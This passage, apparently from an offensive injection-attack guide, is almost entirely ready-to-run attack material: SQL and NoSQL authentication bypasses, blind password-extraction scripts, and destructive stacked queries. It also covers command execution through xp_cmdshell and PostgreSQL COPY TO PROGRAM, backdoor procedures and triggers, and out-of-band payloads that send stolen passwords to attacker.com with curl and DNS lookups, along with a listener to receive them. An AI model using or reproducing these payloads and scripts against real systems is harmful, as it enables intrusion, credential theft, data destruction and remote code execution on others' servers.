    if echo "$response" | grep -qi "welcome\|success\|logged"; then
        echo "[+] POTENTIAL SUCCESS: $payload"
    fi
    
    sleep 0.5
done
```

### Time-Based Polyglot

**Universal time-based polyglot:**

```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND SLEEP(5)--
" AND SLEEP(5)--
' AND pg_sleep(5)--
" AND pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
"; WAITFOR DELAY '0:0:5'--
' AND DBMS_LOCK.SLEEP(5)--
" AND DBMS_LOCK.SLEEP(5)--
```

**Testing script for time-based polyglots:**

```python
#!/usr/bin/env python3
import requests
import time

def test_time_based_sqli(url, param, payloads):
    """
    Test time-based SQL injection with polyglot payloads
    """
    for payload in payloads:
        params = {param: payload}
        
        start_time = time.time()
        try:
            response = requests.get(url, params=params, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed >= 5:  # Sleep duration
                print(f"[+] VULNERABLE - Payload: {payload}")
                print(f"    Response time: {elapsed:.2f}s")
                return True
        except requests.exceptions.Timeout:
            print(f"[+] TIMEOUT - Likely vulnerable: {payload}")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

# Time-based polyglot payloads
payloads = [
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "' AND (SELECT SLEEP(5))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
]

url = "http://target.com/search"
test_time_based_sqli(url, "q", payloads)
```

## NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) use different query languages and data structures, requiring specialized injection techniques.

### MongoDB Injection

**MongoDB query structure:**

MongoDB queries are typically JSON objects:

```javascript
db.users.find({username: "admin", password: "pass123"})
```

**Basic MongoDB injection:**

```javascript
// Original query
{"username": "admin", "password": "user_input"}

// Injection payload: {"$ne": ""}
{"username": "admin", "password": {"$ne": ""}}
// This returns true for any password (not equal to empty string)
```

### MongoDB Operator Exploitation

**Common MongoDB operators for injection:**

```javascript
// $ne - Not equal
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}

// $gt - Greater than
{"username": "admin", "password": {"$gt": ""}}

// $regex - Regular expression
{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}

// $where - JavaScript execution
{"$where": "this.username == 'admin'"}

// $exists - Field exists
{"username": {"$exists": true}, "password": {"$exists": true}}

// $in - Value in array
{"username": {"$in": ["admin", "administrator"]}}
```

### HTTP Parameter-Based NoSQL Injection

**URL parameter injection:**

```bash
# Authentication bypass
http://target.com/login?username=admin&password[$ne]=

# Using different operators
http://target.com/login?username=admin&password[$gt]=
http://target.com/login?username=admin&password[$regex]=.*
http://target.com/login?username[$exists]=true&password[$exists]=true

# Array injection
http://target.com/user?username[$in][]=admin&username[$in][]=administrator
```

**JSON payload injection:**

```bash
# POST request with JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'

# Using $regex for username enumeration
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^a"}, "password": {"$ne": ""}}'
```

### MongoDB JavaScript Injection

**$where operator exploitation:**

```javascript
// Original query
db.users.find({$where: "this.username == 'user_input'"})

// Injection payload
' || '1'=='1
' || this.username == 'admin' || '

// Full exploit
{"$where": "this.username == 'admin' || '1'=='1'"}

// Command execution (older MongoDB versions)
{"$where": "sleep(5000)"}
```

**Testing for $where injection:**

```python
#!/usr/bin/env python3
import requests
import json
import time

def test_mongodb_where_injection(url):
    """
    Test for MongoDB $where operator injection
    """
    payloads = [
        {"username": {"$where": "sleep(5000)"}, "password": "test"},
        {"username": {"$where": "this.username == 'admin' || '1'=='1'"}, "password": "test"},
        {"username": "admin", "password": {"$where": "sleep(5000)"}},
    ]
    
    for payload in payloads:
        print(f"[*] Testing payload: {payload}")
        
        start_time = time.time()
        try:
            response = requests.post(
                url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            elapsed = time.time() - start_time
            
            if elapsed >= 5:
                print(f"[+] VULNERABLE - Time-based injection detected")
                print(f"    Response time: {elapsed:.2f}s")
                return True
            
            if "logged in" in response.text.lower() or "success" in response.text.lower():
                print(f"[+] VULNERABLE - Authentication bypassed")
                return True
                
        except requests.exceptions.Timeout:
            print(f"[+] TIMEOUT - Likely vulnerable")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

test_mongodb_where_injection("http://target.com/api/login")
```

### NoSQL Data Extraction

**Character-by-character extraction using regex:**

```python
#!/usr/bin/env python3
import requests
import string

def extract_password_mongodb(url, username):
    """
    Extract password character by character using regex
    """
    password = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*"
    
    while True:
        found = False
        for char in charset:
            # Test if password starts with current password + char
            payload = {
                "username": username,
                "password": {"$regex": f"^{password}{char}"}
            }
            
            response = requests.post(
                url,
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            
            # Check for success indicators
            if response.status_code == 200 and "success" in response.text.lower():
                password += char
                print(f"[+] Found character: {char} - Password so far: {password}")
                found = True
                break
        
        if not found:
            break
    
    return password

# Extract password
password = extract_password_mongodb("http://target.com/api/login", "admin")
print(f"[+] Extracted password: {password}")
```

**MongoDB data enumeration:**

```bash
# Enumerate usernames
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "^a"}, "limit": 100}'

# Extract all users
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"username": {"$exists": true}}'

# Enumerate field names
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"$where": "Object.keys(this)"}'
```

### CouchDB Injection

**CouchDB uses HTTP REST API with JSON:**

```bash
# Authentication bypass
curl -X POST http://target.com/_session \
  -H "Content-Type: application/json" \
  -d '{"name": "admin", "password": {"$ne": null}}'

# View query injection
http://target.com/db/_design/app/_view/users?key={"$ne":null}

# Mango query injection (CouchDB 2.0+)
curl -X POST http://target.com/db/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"password": {"$gt": null}}}'
```

### Redis Injection

**Redis command injection (if application constructs Redis commands from user input):**

```bash
# Command injection through user input
user_input: test\r\nFLUSHALL\r\nSET key value

# Key enumeration
user_input: *\r\nKEYS *

# Data extraction
user_input: test\r\nGET sensitive_key

# Configuration modification
user_input: test\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET dbfilename shell.php
```

### Automated NoSQL Injection Tools

**NoSQLMap:**

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py

# Scan for NoSQL injection
python nosqlmap.py -u "http://target.com/login" \
  --data "username=admin&password=test"

# Extract data
python nosqlmap.py -u "http://target.com/api/user" \
  --data "id=1" \
  --attack 1  # Extract data
```

**Custom fuzzing script:**

```python
#!/usr/bin/env python3
import requests
import json

def fuzz_nosql_operators(url, param_name, base_value):
    """
    Fuzz NoSQL operators to find injection points
    """
    operators = [
        "$ne", "$gt", "$gte", "$lt", "$lte",
        "$in", "$nin", "$exists", "$regex",
        "$where", "$eq", "$not"
    ]
    
    test_values = ["", "null", "true", "false", ".*", "1"]
    
    for operator in operators:
        for value in test_values:
            # Build payload
            payload = {param_name: {operator: value}}
            
            print(f"[*] Testing: {operator} with value: {value}")
            
            try:
                response = requests.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                # Check for anomalies
                if response.status_code == 200:
                    if len(response.text) != len(base_value):
                        print(f"[+] POTENTIAL VULNERABILITY")
                        print(f"    Operator: {operator}, Value: {value}")
                        print(f"    Response length difference detected")
                
            except Exception as e:
                print(f"[-] Error: {e}")

# Get baseline response
baseline = requests.post(
    "http://target.com/api/login",
    json={"username": "nonexistent", "password": "wrong"},
    headers={"Content-Type": "application/json"}
).text

fuzz_nosql_operators("http://target.com/api/login", "password", baseline)
```

## Query Chaining

Query chaining involves executing multiple SQL statements in sequence, leveraging stacked queries or procedural extensions to perform complex attacks.

### Stacked Queries

**Stacked query syntax varies by DBMS:**

```sql
-- MySQL (requires mysqli_multi_query or specific configurations)
'; DROP TABLE users;--
'; UPDATE users SET password='hacked';--
'; INSERT INTO users VALUES ('hacker','pass');--

-- PostgreSQL
'; DROP TABLE users;--
'; CREATE TABLE shell(output text);--
'; COPY shell FROM PROGRAM 'id';--

-- MSSQL
'; EXEC xp_cmdshell('whoami');--
'; DROP TABLE users;--
'; EXEC sp_configure 'show advanced options',1;--

-- Oracle
'; EXECUTE IMMEDIATE 'DROP TABLE users';--
```

### Detection of Stacked Query Support

**Testing for stacked query capability:**

```sql
-- Time-based detection
'; WAITFOR DELAY '0:0:5';--  (MSSQL)
'; SELECT pg_sleep(5);--     (PostgreSQL)
'; SELECT SLEEP(5);--        (MySQL)

-- Error-based detection
'; SELECT 1/0;--
'; SELECT invalid_function();--
```

**Python detection script:**

```python
#!/usr/bin/env python3
import requests
import time

def detect_stacked_queries(url, param):
    """
    Detect if stacked queries are possible
    """
    # Time-based payloads for different DBMS
    payloads = {
        "MSSQL": "'; WAITFOR DELAY '0:0:5';--",
        "PostgreSQL": "'; SELECT pg_sleep(5);--",
        "MySQL": "'; SELECT SLEEP(5);--",
        "Oracle": "'; DBMS_LOCK.SLEEP(5);--"
    }
    
    for dbms, payload in payloads.items():
        print(f"[*] Testing {dbms} stacked query...")
        
        params = {param: payload}
        start_time = time.time()
        
        try:
            response = requests.get(url, params=params, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed >= 5:
                print(f"[+] STACKED QUERIES SUPPORTED - {dbms}")
                return dbms
        except requests.exceptions.Timeout:
            print(f"[+] LIKELY SUPPORTED (timeout) - {dbms}")
            return dbms
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] Stacked queries not detected")
    return None

dbms = detect_stacked_queries("http://target.com/product", "id")
```

### Advanced Chaining Techniques

**Multi-statement data exfiltration:**

```sql
-- Create temporary table, populate it, and exfiltrate
'; CREATE TABLE tmp_data(data TEXT);--
'; INSERT INTO tmp_data SELECT password FROM users WHERE username='admin';--
'; SELECT * FROM tmp_data;--

-- PostgreSQL COPY to file
'; COPY (SELECT password FROM users) TO '/tmp/passwords.txt';--

-- MSSQL bulk insert preparation
'; CREATE TABLE #temp (data VARCHAR(8000));--
'; INSERT INTO #temp EXEC xp_cmdshell 'type C:\secrets.txt';--
'; SELECT * FROM #temp;--
```

### Command Execution via Query Chaining

**MSSQL xp_cmdshell chaining:**

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'net user hacker Pass123! /add';--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--

-- Exfiltrate data
'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/data.txt C:\temp\data.txt';--
```

**Automated MSSQL exploitation:**

```python
#!/usr/bin/env python3
import requests

def exploit_mssql_xp_cmdshell(url, param, command):
    """
    Exploit MSSQL xp_cmdshell via stacked queries
    """
    # Step 1: Enable xp_cmdshell
    enable_payloads = [
        "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    ]
    
    for payload in enable_payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        print(f"[*] Sent: {payload}")
    
    # Step 2: Execute command
    cmd_payload = f"'; EXEC xp_cmdshell '{command}';--"
    params = {param: cmd_payload}
    response = requests.get(url, params=params)
    
    print(f"[+] Command executed: {command}")
    print(f"[*] Response: {response.text}")
    
    return response.text

# Execute system commands
exploit_mssql_xp_cmdshell(
    "http://target.com/product",
    "id",
    "whoami"
)
```

**PostgreSQL large object chaining:**

```sql
-- Create large object and write file
'; SELECT lo_import('/etc/passwd', 1337);--
'; SELECT lo_export(1337, '/tmp/passwd_copy');--

-- COPY command for RCE (requires superuser)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';--
'; CREATE TABLE cmd_output(output text);--
'; COPY cmd_output FROM PROGRAM 'whoami';--
'; SELECT * FROM cmd_output;--
```

### Chaining with User-Defined Functions

**MySQL UDF exploitation:**

```sql
-- Create malicious UDF
'; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';--
'; SELECT sys_exec('id > /tmp/output.txt');--

-- Read file using LOAD_FILE
'; SELECT LOAD_FILE('/tmp/output.txt');--
```

**PostgreSQL UDF exploitation:**

```sql
-- Create malicious function
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;--
'; SELECT system('id > /tmp/output.txt');--
```

### Chaining for Privilege Escalation

**MSSQL privilege escalation chain:**

```sql
-- Check current privileges
'; SELECT IS_SRVROLEMEMBER('sysadmin');--

-- Impersonate high-privilege user
'; EXECUTE AS LOGIN = 'sa';--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
'; REVERT;--

-- Add user to sysadmin role
'; EXEC sp_addsrvrolemember 'domain\user','sysadmin';--
```

**PostgreSQL privilege escalation:**

```sql
-- Check current user
'; SELECT current_user;--

-- Attempt to escalate via SECURITY DEFINER functions
'; CREATE OR REPLACE FUNCTION priv_esc() RETURNS void AS $$
BEGIN
  EXECUTE 'COPY (SELECT '''') TO PROGRAM ''id > /tmp/output.txt''';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;--
'; SELECT priv_esc();--
```

### Automated Query Chaining Tools

**SQLMap with stacked queries:**

```bash
# Test for stacked queries
sqlmap -u "http://target.com/product?id=1" --technique=S

# Execute OS commands (MSSQL)
sqlmap -u "http://target.com/product?id=1" \
  --os-cmd="whoami" \
  --technique=S

# Read file
sqlmap -u "http://target.com/product?id=1" \
  --file-read="/etc/passwd" \
  --technique=S

# Write file (webshell)
sqlmap -u "http://target.com/product?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php" \
  --technique=S
```

**Custom chaining exploitation framework:**

```python
#!/usr/bin/env python3
import requests
import time

class SQLIChainExploit:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        self.dbms = None
    
    def detect_dbms(self):
        """Detect database management system"""
        fingerprints = {
            "MySQL": "'; SELECT SLEEP(3);--",
            "PostgreSQL": "'; SELECT pg_sleep(3);--",
            "MSSQL": "'; WAITFOR DELAY '0:0:3';--",
            "Oracle": "'; BEGIN DBMS_LOCK.SLEEP(3); END;--"
        }
        
        for dbms, payload in fingerprints.items():
            start = time.time()
            self._send_payload(payload)
            elapsed = time.time() - start
            
            if elapsed >= 3:
                self.dbms = dbms
                print(f"[+] Detected DBMS: {dbms}")
                return dbms
        
        return None
    
    def _send_payload(self, payload):
        """Send SQL injection payload"""
        params = {self.param: payload}
        try:
            response = requests.get(self.url, params=params, timeout=10)
            return response.text
        except:
            return None
    
    def execute_command(self, command):
        """Execute OS command based on DBMS"""
        if self.dbms == "MSSQL":
            return self._mssql_execute(command)
        elif self.dbms == "PostgreSQL":
            return self._postgresql_execute(command)
        else:
            print(f"[-] Command execution not implemented for {self.dbms}")
            return None
    
    def _mssql_execute(self, command):
        """Execute command on MSSQL"""
        # Enable xp_cmdshell
        payloads = [
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
            "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
            f"'; EXEC xp_cmdshell '{command}';--"
        ]
        
        for payload in payloads:
            self._send_payload(payload)
            time.sleep(0.5)
        
        print(f"[+] Executed command: {command}")
    
    def _postgresql_execute(self, command):
        """Execute command on PostgreSQL"""
        payload = f"'; COPY (SELECT '') TO PROGRAM '{command}';--"
        self._send_payload(payload)
        print(f"[+] Executed command: {command}")
    
    def exfiltrate_table(self, table_name):
        """Exfiltrate entire table via chaining"""
        payloads = [
            f"'; CREATE TABLE tmp_exfil AS SELECT * FROM {table_name};--",
            "'; SELECT * FROM tmp_exfil;--"
        ]
        
        for payload in payloads:
            response = self._send_payload(payload)
            if response:
                print(f"[*] Response: {response[:200]}")

# Usage example
exploit = SQLIChainExploit("http://target.com/product", "id")
exploit.detect_dbms()
exploit.execute_command("whoami")
```

---

## Second-Order Query Chaining

### Second-Order Exploitation Methodology

Second-order SQL injection occurs when user input is stored in the database and later incorporated into SQL queries without proper sanitization during retrieval.

**Attack flow:**

1. Inject malicious payload into storage (registration, profile update)
2. Trigger execution context where stored data is used in queries
3. Payload executes in different context with potentially higher privileges

### Common Second-Order Injection Points

**User registration forms:**

```sql
-- Registration payload (stored in database)
username: admin'-- 
email: test@test.com', (SELECT password FROM users WHERE id=1))-- 

-- Later executed in query
INSERT INTO user_profiles (username, bio) VALUES ('admin'-- ', 'Default bio')
-- Results in: INSERT INTO user_profiles (username, bio) VALUES ('admin'
```

**Profile update exploitation:**

```python
#!/usr/bin/env python3
import requests

def second_order_sqli_exploit(target_url, register_url, trigger_url):
    """
    Exploit second-order SQL injection
    """
    # Stage 1: Register with malicious payload
    payloads = [
        "'; UPDATE users SET role='admin' WHERE username='attacker';--",
        "'; INSERT INTO admins SELECT * FROM users WHERE username='attacker';--",
        "' UNION SELECT password FROM users WHERE username='admin'-- "
    ]
    
    for payload in payloads:
        print(f"[*] Registering with payload: {payload}")
        
        # Register user with malicious username/bio
        register_data = {
            "username": "attacker",
            "bio": payload,
            "email": "attacker@test.com"
        }
        
        session = requests.Session()
        response = session.post(register_url, data=register_data)
        
        if response.status_code == 200:
            print("[+] Registration successful")
            
            # Stage 2: Trigger the vulnerable query
            # This could be viewing profile, generating reports, etc.
            time.sleep(1)
            trigger_response = session.get(trigger_url)
            
            print(f"[*] Trigger response status: {trigger_response.status_code}")
            print(f"[*] Response excerpt: {trigger_response.text[:200]}")
            
            # Check if privilege escalation succeeded
            check_response = session.get(f"{target_url}/admin")
            if check_response.status_code == 200:
                print("[+] PRIVILEGE ESCALATION SUCCESSFUL")
                return True
    
    return False

# Example usage
second_order_sqli_exploit(
    target_url="http://target.com",
    register_url="http://target.com/register",
    trigger_url="http://target.com/profile/view"
)
```

### Chaining via Stored Procedures

**Creating malicious stored procedures:**

```sql
-- MSSQL stored procedure injection
'; CREATE PROCEDURE backdoor AS EXEC xp_cmdshell 'whoami';--
'; EXEC backdoor;--

-- More sophisticated procedure
'; CREATE PROCEDURE data_exfil @cmd VARCHAR(255) AS 
BEGIN
    DECLARE @output TABLE (line VARCHAR(8000))
    INSERT INTO @output EXEC xp_cmdshell @cmd
    SELECT * FROM @output
END;--

-- Execute
'; EXEC data_exfil 'dir C:\';--
```

**PostgreSQL function chaining:**

```sql
-- Create function for command execution
'; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
DECLARE
    output text;
BEGIN
    CREATE TEMP TABLE IF NOT EXISTS cmd_output(line text);
    EXECUTE format('COPY cmd_output FROM PROGRAM %L', cmd);
    SELECT string_agg(line, E'\n') INTO output FROM cmd_output;
    DROP TABLE cmd_output;
    RETURN output;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;--

-- Execute commands
'; SELECT exec_cmd('whoami');--
'; SELECT exec_cmd('cat /etc/passwd');--
```

**Automated stored procedure exploitation:**

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def exploit_stored_procedure_chain(url, param, dbms):
    """
    Exploit SQL injection via stored procedure chaining
    """
    if dbms.lower() == "mssql":
        # Create backdoor procedure
        create_proc = "'; CREATE PROCEDURE cmd_exec @cmd VARCHAR(255) AS EXEC xp_cmdshell @cmd;--"
        exec_proc = "'; EXEC cmd_exec 'whoami';--"
        
    elif dbms.lower() == "postgresql":
        create_proc = """'; CREATE OR REPLACE FUNCTION cmd_exec(text) RETURNS text AS $$
        DECLARE output text;
        BEGIN
            CREATE TEMP TABLE tmp_output(line text);
            EXECUTE 'COPY tmp_output FROM PROGRAM ' || quote_literal($1);
            SELECT string_agg(line, E'\\n') INTO output FROM tmp_output;
            DROP TABLE tmp_output;
            RETURN output;
        END;
        $$ LANGUAGE plpgsql;--"""
        exec_proc = "'; SELECT cmd_exec('id');--"
    
    else:
        print(f"[-] Unsupported DBMS: {dbms}")
        return
    
    # Step 1: Create procedure
    print("[*] Creating malicious stored procedure...")
    params = {param: create_proc}
    requests.get(url, params=params)
    
    # Step 2: Execute procedure
    print("[*] Executing stored procedure...")
    params = {param: exec_proc}
    response = requests.get(url, params=params)
    
    print(f"[+] Response: {response.text[:500]}")

exploit_stored_procedure_chain(
    "http://target.com/product",
    "id",
    "mssql"
)
```

### Trigger-Based Chaining

**Creating malicious triggers:**

```sql
-- MySQL trigger for data exfiltration
'; CREATE TRIGGER exfil_trigger AFTER INSERT ON orders
FOR EACH ROW
BEGIN
    INSERT INTO log_table (data) VALUES (CONCAT(NEW.customer_id, ':', NEW.credit_card));
END;--

-- MSSQL trigger for privilege escalation
'; CREATE TRIGGER backdoor_trigger ON users AFTER INSERT AS
BEGIN
    IF EXISTS(SELECT * FROM inserted WHERE username='attacker')
    BEGIN
        UPDATE users SET role='admin' WHERE username='attacker'
    END
END;--

-- PostgreSQL trigger with command execution
'; CREATE OR REPLACE FUNCTION trigger_backdoor() RETURNS trigger AS $$
BEGIN
    PERFORM pg_sleep(5);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;--

'; CREATE TRIGGER backdoor BEFORE INSERT ON logs
FOR EACH ROW EXECUTE FUNCTION trigger_backdoor();--
```

### Blind Chaining Techniques

**Time-based blind chaining:**

```sql
-- Chain multiple sleep commands for data extraction
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a' WAITFOR DELAY '0:0:5';--

-- PostgreSQL conditional time-based
'; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' 
   THEN pg_sleep(5) ELSE pg_sleep(0) END;--

-- MySQL conditional chaining
'; SELECT IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0);--
```

**Automated blind chaining extraction:**

```python
#!/usr/bin/env python3
import requests
import time
import string

class BlindSQLIChain:
    def __init__(self, url, param, dbms):
        self.url = url
        self.param = param
        self.dbms = dbms.lower()
        self.charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    def _build_time_payload(self, condition):
        """Build time-based payload for specific DBMS"""
        if self.dbms == "mssql":
            return f"'; IF ({condition}) WAITFOR DELAY '0:0:5';--"
        elif self.dbms == "postgresql":
            return f"'; SELECT CASE WHEN ({condition}) THEN pg_sleep(5) ELSE pg_sleep(0) END;--"
        elif self.dbms == "mysql":
            return f"'; SELECT IF(({condition}), SLEEP(5), 0);--"
        else:
            return None
    
    def _test_condition(self, condition):
        """Test if condition is true using time-based technique"""
        payload = self._build_time_payload(condition)
        if not payload:
            return False
        
        params = {self.param: payload}
        start = time.time()
        
        try:
            requests.get(self.url, params=params, timeout=10)
            elapsed = time.time() - start
            return elapsed >= 4.5  # Account for network latency
        except requests.exceptions.Timeout:
            return True
        except Exception:
            return False
    
    def extract_data(self, query, max_length=50):
        """Extract data character by character"""
        extracted = ""
        
        for position in range(1, max_length + 1):
            found = False
            
            for char in self.charset:
                # Build condition to test character at position
                if self.dbms == "mssql":
                    condition = f"SUBSTRING(({query}),{position},1)='{char}'"
                elif self.dbms == "postgresql":
                    condition = f"SUBSTRING(({query}),{position},1)='{char}'"
                elif self.dbms == "mysql":
                    condition = f"SUBSTRING(({query}),{position},1)='{char}'"
                
                print(f"[*] Testing position {position}, character: {char}", end="\r")
                
                if self._test_condition(condition):
                    extracted += char
                    print(f"\n[+] Found character: {char} - Extracted: {extracted}")
                    found = True
                    break
            
            if not found:
                print(f"\n[*] No more characters found")
                break
        
        return extracted
    
    def chain_extract_multiple(self, table, column, where_clause="1=1"):
        """Chain extraction of multiple rows"""
        results = []
        
        # First, get count of rows
        count_query = f"SELECT COUNT(*) FROM {table} WHERE {where_clause}"
        print("[*] Extracting row count...")
        # For simplicity, assume we know the count or extract it separately
        
        # Extract each row
        for row_num in range(1, 5):  # Limit to first 5 rows
            if self.dbms == "mssql":
                query = f"SELECT TOP 1 {column} FROM (SELECT TOP {row_num} {column} FROM {table} WHERE {where_clause} ORDER BY {column}) sub ORDER BY {column} DESC"
            elif self.dbms in ["mysql", "postgresql"]:
                query = f"SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1 OFFSET {row_num-1}"
            
            print(f"\n[*] Extracting row {row_num}...")
            data = self.extract_data(query)
            
            if data:
                results.append(data)
                print(f"[+] Row {row_num}: {data}")
            else:
                break
        
        return results

# Usage example
exploiter = BlindSQLIChain("http://target.com/product", "id", "mssql")

# Extract admin password
admin_password = exploiter.extract_data("SELECT password FROM users WHERE username='admin'")
print(f"\n[+] Admin password: {admin_password}")

# Extract multiple usernames
usernames = exploiter.chain_extract_multiple("users", "username")
print(f"\n[+] Extracted usernames: {usernames}")
```

### Out-of-Band (OOB) Chaining

**DNS exfiltration via chaining:**

```sql
-- MSSQL DNS exfiltration
'; DECLARE @data VARCHAR(255);
   SET @data = (SELECT TOP 1 password FROM users);
   EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"');--

-- MySQL DNS exfiltration (requires LOAD_FILE with UNC paths on Windows)
'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'));--

-- PostgreSQL with COPY TO PROGRAM
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'nslookup $(cat) attacker.com';--
```

**HTTP exfiltration chaining:**

```sql
-- MSSQL HTTP exfiltration via xp_cmdshell
'; DECLARE @cmd VARCHAR(8000);
   DECLARE @data VARCHAR(8000);
   SET @data = (SELECT password FROM users WHERE id=1);
   SET @cmd = 'curl http://attacker.com/exfil?data=' + @data;
   EXEC xp_cmdshell @cmd;--

-- PostgreSQL HTTP exfiltration
'; COPY (SELECT password FROM users) TO PROGRAM 'curl -d @- http://attacker.com/exfil';--

-- Oracle HTTP exfiltration via UTL_HTTP
'; DECLARE
     result VARCHAR2(4000);
     req UTL_HTTP.REQ;
     resp UTL_HTTP.RESP;
   BEGIN
     SELECT password INTO result FROM users WHERE id=1;
     req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfil?data=' || result);
     resp := UTL_HTTP.GET_RESPONSE(req);
     UTL_HTTP.END_RESPONSE(resp);
   END;--
```

**Automated OOB exfiltration:**

```python
#!/usr/bin/env python3
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import urllib.parse

class ExfilHandler(BaseHTTPRequestHandler):
    """HTTP server to receive exfiltrated data"""
    exfiltrated_data = []
    
    def do_GET(self):
        # Parse exfiltrated data from URL
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        
        if 'data' in query:
            data = query['data'][0]
            print(f"\n[+] EXFILTRATED DATA: {data}")
            ExfilHandler.exfiltrated_data.append(data)
        
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress logging

def start_exfil_server(port=8080):
    """Start HTTP server to receive exfiltrated data"""
    server = HTTPServer(('0.0.0.0', port), ExfilHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    print(f"[*] Exfiltration server started on port {port}")
    return server

def oob_sqli_exfiltration(target_url, param, attacker_ip, attacker_port=8080):
    """
    Perform OOB SQL injection data exfiltration
    """
    # Start listener
    server = start_exfil_server(attacker_port)
    
    # MSSQL OOB payload
    payload = f"""'; DECLARE @data VARCHAR(8000);
    DECLARE @cmd VARCHAR(8000);
    SET @data = (SELECT STRING_AGG(username+':'+password, ',') FROM users);
    SET @cmd = 'curl http://{attacker_ip}:{attacker_port}/exfil?data=' + @data;
    EXEC xp_cmdshell @cmd;--"""
    
    print(f"[*] Sending OOB payload...")
    params = {param: payload}
    
    try:
        requests.get(target_url, params=params, timeout=10)
    except:
        pass
    
    # Wait for data
    print("[*] Waiting for exfiltrated data...")
    import time
    time.sleep(5)
    
    # Display results
    if ExfilHandler.exfiltrated_data:
        print(f"\n[+] Total exfiltrated entries: {len(ExfilHandler.exfiltrated_data)}")
        for entry in ExfilHandler.exfiltrated_data:
            print(f"    {entry}")
    else:
        print("[-] No data received")
    
    server.shutdown()

# Usage
oob_sqli_exfiltration(
    target_url="http://target.com/product",
    param="id",
    attacker_ip="YOUR_IP",
    attacker_port=8080
)
```

### Advanced Chaining with CTEs

**Common Table Expressions (CTEs) for complex chaining:**

```sql
-- PostgreSQL recursive CTE for data enumeration
'; WITH RECURSIVE data_exfil AS (
    SELECT 1 AS n, (SELECT password FROM users LIMIT 1) AS pass
    UNION ALL
    SELECT n+1, (SELECT password FROM users LIMIT 1 OFFSET n) 
    FROM data_exfil WHERE n < 10
)
SELECT * FROM data_exfil;--

-- MSSQL CTE for privilege escalation
'; WITH elevated AS (
    SELECT name, password_hash FROM sys.sql_logins WHERE is_disabled=0
)
SELECT * INTO temp_creds FROM elevated;
SELECT * FROM temp_creds;--

-- Complex chaining with multiple CTEs
'; WITH userdata AS (
    SELECT id, username, password FROM users
),
admindata AS (
    SELECT * FROM userdata WHERE role='admin'
)
INSERT INTO exfil_table SELECT * FROM admindata;--
```

### Error-Based Chaining

**Chaining error messages for data extraction:**

```sql
-- MSSQL error-based chaining
'; DECLARE @data VARCHAR(8000);
   SET @data = (SELECT TOP 1 username+':'+password FROM users);
   RAISERROR(@data, 16, 1);--

-- MySQL error-based with extractvalue
